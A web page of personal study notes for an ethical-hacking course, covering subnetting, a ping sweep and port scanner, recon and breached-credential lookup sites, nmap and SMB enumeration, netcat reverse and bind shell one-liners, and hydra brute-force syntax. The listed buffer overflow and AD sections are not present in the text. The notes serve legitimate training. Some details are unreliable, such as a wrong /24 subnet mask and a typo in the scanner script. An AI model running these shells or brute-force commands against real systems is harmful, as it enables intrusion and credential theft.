<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>1 - Practical Ethical Hacker |</title>
<meta name="description" content="Recon, Scans, Buffer Overflow, AD, Web exploitation and More ">


  <meta name="author" content="Nullified">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="">
<meta property="og:title" content="1 - Practical Ethical Hacker">
<meta property="og:url" content="http://localhost:4000/notes/pnpt/peh/">


  <meta property="og:description" content="Recon, Scans, Buffer Overflow, AD, Web exploitation and More ">



  <meta property="og:image" content="http://localhost:4000/assets/images/main/header3.jpg">





  <meta property="article:published_time" content="2023-11-25T00:00:00+06:00">





  

  


<link rel="canonical" href="http://localhost:4000/notes/pnpt/peh/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "john",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
        
        <a class="site-title" href="/">
          
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/menu">Menu</a>
            </li><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
  
    

    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header3.jpg');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          1 - Practical Ethical Hacker

        
      </h1>
      
        <p class="page__lead">Learn essential hacking skills, and defend systems with integrity.
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  29 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  
  
    
      
      
      
      
    
    
      

<nav class="nav__list">
  
  <input id="ac-toc" name="accordion-toc" type="checkbox" />
  <label for="ac-toc">Toggle menu</label>
  <ul class="nav__items">
    
      <li>
        
          <span class="nav__sub-title">Posts</span>
        

        
        <ul>
          
            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
          
            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
          
            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
          
            <li><a href="">────────────────</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">Notes</span>
        

        
        <ul>
          
            <li><a href="/notes/ejpt/">eJPT</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/ecppt/">eCPPTv2</a></li>
          
            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
          
            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
          
            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
          
            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
          
            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
          
            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/pnpt/">PNPT</a></li>
          
            <li><a href="/notes/pnpt/peh/" class="active">- Practical Ethical Hacker</a></li>
          
            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
          
            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
          
            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
          
            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
          
            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/eewptx/">eWPTXv2</a></li>
          
            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
          
            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
          
            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
          
            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
          
            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
          
            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
          
            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
          
            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
          
            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
          
            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
          
            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
          
            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
          
            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="">Active Directory Exploitation</a></li>
          
            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
          
            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
          
            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crtp/">CRTP</a></li>
          
            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
          
            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
          
            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
          
            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
          
            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crte/">CRTE</a></li>
          
            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
          
            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
          
            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">My CVEs</span>
        

        
        <ul>
          
            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
          
            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
          
        </ul>
        
      </li>
    
  </ul>
</nav>

    
  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="1 - Practical Ethical Hacker">
    <meta itemprop="description" content="Learn essential hacking skills, and defend systems with integrity.">
    <meta itemprop="datePublished" content="2023-11-25T00:00:00+06:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#pre-study-session">Pre-Study Session</a>
    <ul>
      <li><a href="#network">Network</a></li>
      <li><a href="#linux">Linux</a></li>
      <li><a href="#python">Python</a></li>
    </ul>
  </li>
  <li><a href="#the-five-stages-of-hacking">The Five stages of hacking</a>
    <ul>
      <li><a href="#reconnaissance">Reconnaissance</a></li>
      <li><a href="#scanning--enumeration">Scanning &amp; Enumeration</a></li>
      <li><a href="#gaining-access">Gaining Access</a></li>
      <li><a href="#capstone">Capstone</a></li>
    </ul>
  </li>
  <li><a href="#buffer-overflow">Buffer Overflow</a>
    <ul>
      <li><a href="#anatomy-of-memory">Anatomy of Memory</a></li>
      <li><a href="#anatomy-of-stack">Anatomy of Stack</a></li>
      <li><a href="#spiking">Spiking</a></li>
      <li><a href="#fuzzing">Fuzzing</a></li>
      <li><a href="#finding-the-offset">Finding the Offset</a></li>
      <li><a href="#overwriting-the-eip">Overwriting the EIP</a></li>
      <li><a href="#finding-bad-characters">Finding Bad Characters</a></li>
      <li><a href="#finding-the-right-module">Finding the right module</a></li>
      <li><a href="#generating-shellcode-and-gaining-root">Generating Shellcode and Gaining Root</a></li>
      <li><a href="#exploit-development-using-python3-and-mona">Exploit Development Using Python3 and Mona</a></li>
    </ul>
  </li>
  <li><a href="#ad">AD</a>
    <ul>
      <li><a href="#physical-ad-components">Physical AD Components</a></li>
      <li><a href="#logical-ad-components">Logical AD Components</a></li>
      <li><a href="#lab-overview-and-requirements">Lab Overview and Requirements</a></li>
      <li><a href="#attacking-ad-initial-attack-vectors">Attacking AD: Initial Attack Vectors</a></li>
      <li><a href="#powerview-cheatsheet">PowerView CheatSheet</a></li>
      <li><a href="#post-compromise-attacks">Post-Compromise Attacks</a></li>
    </ul>
  </li>
  <li><a href="#post-exploitation">Post Exploitation</a>
    <ul>
      <li><a href="#file-transfer-review">File Transfer Review</a></li>
      <li><a href="#maintaining-access">Maintaining Access</a></li>
    </ul>
  </li>
  <li><a href="#web-application">Web Application</a>
    <ul>
      <li><a href="#web-application-enumeration">Web Application Enumeration</a></li>
      <li><a href="#testing-owasp-top-10">Testing OWASP Top 10</a></li>
    </ul>
  </li>
  <li><a href="#wireless-penetration-testing">Wireless Penetration Testing</a>
    <ul>
      <li><a href="#assessment-of-wireless-network">Assessment of wireless network</a></li>
      <li><a href="#wpa_ps2_exploit">WPA_PS2_Exploit</a></li>
    </ul>
  </li>
  <li><a href="#report">Report</a>
    <ul>
      <li><a href="#common-legal-documents">Common Legal Documents</a></li>
      <li><a href="#pentest-report-writing">Pentest Report Writing</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="pre-study-session">Pre-Study Session</h1>

<ul>
  <li>network</li>
  <li>linux</li>
  <li>python</li>
</ul>

<h2 id="network">Network</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IPv4
  32 bits - Decimal
IPv6
  128 bits - Hexadecimal

MAC (media access control)
  Layer 2
  Relate to switches communication
  Every equipment in the network (or NIC - network interface controller) has one
  Has 8 pares 
  The first 3 pares are identifiers
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TCP
  SYN &gt; SYN/ACK &gt; ACK

PORTS (Common)
TCP
  FTP (21)
  SSH (22)
  Telnet (23)
  SMTP (25)
  DNS (53)
  HTTP (80)
  HTTPS (443)
  SMB (139 + 445)
  IMAP (143

UDP
  DNS (53)
  DHCP (67,68)
  TFTP (69)
  SNMP (161)
</code></pre></div></div>

<p>Subnet:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/24 =&gt; network = 255.255.255.0
Why is /24? because adding the binary check of each octect has the total of 24 bits
example: 255.255.255.0 = 11111111.11111111.11111111.00000000 = /24
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>1  2  3  4  5  6  7  8</td>
      <td>255.0.0.0</td>
    </tr>
    <tr>
      <td>9 10 11 12 13 14 15 16</td>
      <td>255.255.0.0</td>
    </tr>
    <tr>
      <td>17 18 19 20 21 22 23 24</td>
      <td>255.255.255.0</td>
    </tr>
    <tr>
      <td>25 26 27 28 29 30 31 32</td>
      <td>255.255.255.255</td>
    </tr>
  </tbody>
</table>

<p>Hosts:</p>

<table>
  <tbody>
    <tr>
      <td>128  64  32  16   8   4   2   1</td>
    </tr>
  </tbody>
</table>

<p>Subnet:</p>

<table>
  <tbody>
    <tr>
      <td>128 192 224 240 248 252 254 255</td>
    </tr>
  </tbody>
</table>

<p>ps:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hosts double each increment of a CIDR
Always subtract 2 from host total:
network ID - First address
broadcast  - last address
</code></pre></div></div>

<p>Examples:</p>

<table>
  <tbody>
    <tr>
      <td>IP</td>
      <td>subnet</td>
      <td>hosts</td>
      <td>network</td>
      <td>broadcast</td>
    </tr>
    <tr>
      <td>192.168.1.0/24</td>
      <td>255.255.252.0</td>
      <td>254</td>
      <td>192.168.1.0</td>
      <td>192.168.1.255</td>
    </tr>
    <tr>
      <td>192.168.1.0/28</td>
      <td>255.255.255.240</td>
      <td>14</td>
      <td>192.168.1.0</td>
      <td>192.168.1.15</td>
    </tr>
    <tr>
      <td>192.168.1.16/28</td>
      <td>255.255.255.240</td>
      <td>14</td>
      <td>192.168.1.16</td>
      <td>192.168.1.31</td>
    </tr>
    <tr>
      <td>192.168.0.0/23</td>
      <td>255.255.254.0</td>
      <td>510</td>
      <td>192.168.0.0</td>
      <td>192.168.1.255</td>
    </tr>
    <tr>
      <td>192.168.2.0/23</td>
      <td>255.255.254.0</td>
      <td>510</td>
      <td>192.168.2.0</td>
      <td>192.168.3.255</td>
    </tr>
  </tbody>
</table>

<p>Test:</p>

<table>
  <tbody>
    <tr>
      <td>IP</td>
      <td>subnet</td>
      <td>hosts</td>
      <td>network</td>
      <td>broadcast</td>
    </tr>
    <tr>
      <td>192.168.0.0/22</td>
      <td>255.255.252.0</td>
      <td>1022</td>
      <td>192.168.0.0</td>
      <td>192.168.3.255</td>
    </tr>
    <tr>
      <td>192.168.1.0/26</td>
      <td>255.255.255.192</td>
      <td>62</td>
      <td>192.168.1.0</td>
      <td>192.168.1.63</td>
    </tr>
    <tr>
      <td>192.168.1.0/27</td>
      <td>255.255.255.224</td>
      <td>30</td>
      <td>192.168.1.0</td>
      <td>192.168.1.31</td>
    </tr>
  </tbody>
</table>

<h2 id="linux">Linux</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping &lt;ip&gt; -c 1 &gt; ip.txt

cat ip.txt | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"
grep 
# -v "something " = grab everything except what you specified after -v
# "somethin" grab what you specified
cut 
# -d = delimiter, in this case its a space
# -f = the 4th junk of that data separeted by spaces
tr (translate)
# -d ":" = delimiter - to extract that coma from the line 

</code></pre></div></div>

<p>ipsweep.sh:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">]</span>
  <span class="k">then
  </span><span class="nb">echo</span> <span class="s2">"You forgot an IP address!"</span>
  <span class="nb">echo</span> <span class="s2">"Syntax: ./ipweep.sh 192.168.0"</span>

<span class="k">else
for </span>ip <span class="k">in</span> <span class="sb">`</span><span class="nb">seq </span>1 254<span class="sb">`</span><span class="p">;</span> <span class="k">do
  </span>ping <span class="nt">-c</span> 1 <span class="nv">$1</span>.<span class="nv">$ip</span> | <span class="nb">grep</span> <span class="s2">"64 bytes"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 4 | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">":"</span> &amp;
  <span class="k">done
fi</span>

</code></pre></div></div>

<h2 id="python">Python</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/bin/python3
</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>

<span class="c1"># Define our Target
</span><span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
  <span class="n">target</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">gethostbyname</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># Translate hostaname to IPv4
</span><span class="k">else</span><span class="p">:</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid amount of arguments</span><span class="sh">"</span><span class="p">)</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Syntax: python3 scanner.py &lt;ip&gt;</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Add a pretty banner
</span><span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Scanning target </span><span class="sh">"</span><span class="o">+</span><span class="n">target</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Time started: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">()))</span>
<span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
  <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span><span class="mi">85</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socker</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">socket</span><span class="p">.</span><span class="nf">setdefaulttimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">connect_ex</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="n">port</span><span class="p">))</span> <span class="c1"># returns an error indicator
</span>    <span class="k">if</span> <span class="n">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
      <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Port </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s"> is open</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Exiting program.</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
<span class="k">except</span> <span class="n">socket</span><span class="p">.</span><span class="n">gaierror</span><span class="p">:</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Hostname could not be resolved.</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
<span class="k">except</span> <span class="n">socker</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Could not connect to server.</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<h1 id="the-five-stages-of-hacking">The Five stages of hacking</h1>

<ol>
  <li>
    <p>Reconnaissance</p>

    <p>Active vs Passive</p>
  </li>
  <li>
    <p>Scanning &amp; Enumeration</p>

    <p>nmap, nessus, nikto etc</p>
  </li>
  <li>
    <p>Gaining Access</p>

    <p>exploitation</p>
  </li>
  <li>
    <p>Maintaining Access</p>
  </li>
  <li>
    <p>Covering Tracks</p>
  </li>
</ol>

<h2 id="reconnaissance">Reconnaissance</h2>

<h3 id="physical--social-assessment">Physical / Social assessment</h3>

<p>Location Information:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Satellite images
Drone recon
Building layout (badge readers, break areas, security, fencing)
Job Information
Employees (name, job title, phone number, manager, etc)
pictures (badge photos, desk photos, computer photos, etc)
</code></pre></div></div>

<h3 id="web--host">Web / Host</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Target Validation:
  WHOIS, nslookup, dnsrecon

Finding Subdomains:
  Google Fu, dig, nmap, sublist3r, Bluto, crt.sh, etc

Fingerprinting:
  nmap, wappalyzer, whatweb, BuiltWIth, netcat

Data Breaches:
  HaveIBeenPwned, Breach-Parse, WeLeakInfo
</code></pre></div></div>

<h3 id="identifying-our-targets">Identifying our targets</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bugcrowd.com # find companies that we can scan in scope
hunter.io # find email addresses
phonebook.cz # list domains, emails
voilanorbert.com # find email addresses
clearbit connect # using within google account to find emails 
tools.verifyemailaddress.io # email verification
email-checker.net/validate # email verification
</code></pre></div></div>

<h3 id="gather-breachead-credentials-with-breach-parse-at-wmaverickadams-github">Gather breachead credentials with breach-parse at wmaverickadams github</h3>
<p>breach-parse has +40gb of files that were breached with the sh program, we can scan through this files</p>

<h3 id="gather-breached-credentials-with-dehashed">Gather breached credentials with DeHashed</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dehashed.com # search emails, phones, usernames, password, etc
hashes.org # search breached hashes
</code></pre></div></div>

<h3 id="hunting-subdomains">Hunting subdomains</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sublist3r -d &lt;domain&gt;
crt.sh = %.&lt;domain&gt;  # search certificates that have been registered
owasp amass - github 
tomnomnom/httprobe # github = to test the list of domains
</code></pre></div></div>

<h3 id="identifying-website-technologies">Identifying Website technologies</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>builtWith.com = Find out what websites are built with
wappalyzer - firefox extension = go to the website and run the extension
whatweb
burpsuite 
social media = look 'for' badges, names, pcs, etc
</code></pre></div></div>

<h3 id="google-fu">Google Fu</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site: &lt;&gt; filetype:&lt;&gt; -www +something 
</code></pre></div></div>

<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>

<h3 id="network-discover">Network discover</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp-scan -l 
netdiscover -r
</code></pre></div></div>

<h3 id="port-scan">port scan</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NMAP
-sS = SYN SYN/ACK RST (its not send an ack back, thats the stealth mode)

nmap -T4 -p- -A -sC -sV -oA nmap/initial -vv

-sU = udp we may scan with -p only 1000 ports, cause it takes too long to finish
</code></pre></div></div>

<h3 id="vulnerability-scan">vulnerability scan</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto
</code></pre></div></div>

<h3 id="directory-scan">directory scan</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb
dirbuster
gobuster
dirsearch
</code></pre></div></div>

<h3 id="scan-smb">scan SMB</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auxiliary/scanner/smb/smb_version
smbclient -L \\\\&lt;ip&gt;\\ = list the shares
smbclient \\\\&lt;ip&gt;\\&lt;share&gt; = open the share
</code></pre></div></div>

<h3 id="enumerate-ssh">enumerate ssh</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\ssh &lt;ip&gt; 
-oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc 
</code></pre></div></div>

<blockquote>
  <p>just because the kioptrix1 is old, we need to add these informations
sometimes we try to login without a login/pwd just to see if there is a banner with information that we can use</p>
</blockquote>

<h3 id="researching-potential-vulnerablities">Researching potential vulnerablities</h3>
<p>Now we search with the applications and versions that we found earlier, and try to find any exploit that we can use:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>with google:
  exploit-db
  rapid7

with searchsploit:
  -x = to see the code
  -m = to copy the exploit

with msfconsole: 
  search
</code></pre></div></div>

<h3 id="configuring-nessus">Configuring Nessus</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download &gt; start service &gt; get key with email &gt; enter localhost port 8834
use schedule option if u wanna *sleep more*

/opt/nessus/sbin/nessuscli lsuser # to list User
/opt/nessus/sbin/nessuscli chpasswd &lt;user&gt; # to change the password

</code></pre></div></div>

<h2 id="gaining-access">Gaining Access</h2>

<h3 id="netcat-reverse-shell----the-target-connect-to-us---used-the-majority-of-the-time">Netcat Reverse Shell  =  the target connect to us - used the majority of the time</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kali:
nc <span class="nt">-lvnp</span> &lt;port&gt;

Target:
nc &lt;kali ip&gt; &lt;port&gt; <span class="nt">-e</span> /bin/sh
</code></pre></div></div>

<h3 id="netcat-bind-shell----we-connect-to-target">Netcat Bind Shell  =  we connect to target</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kali:
nc &lt;ip&gt; &lt;port&gt;

Target:
nc <span class="nt">-lvnp</span> &lt;port&gt; <span class="nt">-e</span> /bin/sh
</code></pre></div></div>

<h3 id="non-staged-vs-staged-payloads">Non-staged vs staged payloads</h3>

<p><strong>non-staged</strong> = send exploit shellcode all at once
larger in size and wont always work
example:
  windows/meterpreter_reverse_tcp</p>

<p><strong>staged</strong> = send payloads in stages
can be less stable
example:
  windows/meterpreter/reverse_tcp</p>

<blockquote>
  <p>Tips - sometimes try to change the type of payload non-staged/staged</p>
</blockquote>

<h3 id="exploits">Exploits</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit
msfconsole
</code></pre></div></div>

<h3 id="bruteforce">Bruteforce</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> &lt;user&gt; <span class="nt">-L</span> &lt;user file&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-P</span> &lt;password file&gt; &lt;host&gt; &lt;service&gt; &lt;req:user/pwd:msg of failure&gt; <span class="nt">-t</span> &lt;threads&gt;

msfconsole <span class="o">&gt;</span> auxiliary/scanner/ssh/ssh_login
</code></pre></div></div>

<h3 id="burp-tips">Burp tips</h3>
<p>We can use sniper type of attack to attack one variable and use pitchfork if we need more than 1 variable in burp. Or cluster bomb if we need to try every login/pass possible. To do password spraying or credential stuffing</p>

